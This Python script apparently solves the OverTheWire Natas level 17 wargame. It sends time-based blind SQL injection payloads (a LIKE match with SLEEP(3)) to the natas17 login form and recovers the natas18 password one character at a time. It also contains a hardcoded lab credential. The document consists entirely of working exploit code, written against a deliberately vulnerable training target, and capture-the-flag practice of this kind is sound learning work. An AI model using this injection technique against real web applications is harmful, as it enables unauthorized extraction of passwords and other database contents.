import requests
import string
import time

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
url = f"http://natas17.natas.labs.overthewire.org/index.php"
letters = string.ascii_letters + string.digits
nataspass = ''

while len(nataspass) < 32:
    for char in letters:
        print(f"Attempting: {nataspass}{char}", end="\r")
        payload = f'natas18" AND IF(BINARY password LIKE "{nataspass}{char}%", SLEEP(3), 0) -- '
        start = time.time()
        response = requests.post(url, auth=(username, password), data={"username": payload})
        elapsed = time.time() - start
        if elapsed >= 3:
            nataspass += char
            print(f"Found so far: {nataspass}")
            break

print(f"Password: {nataspass}")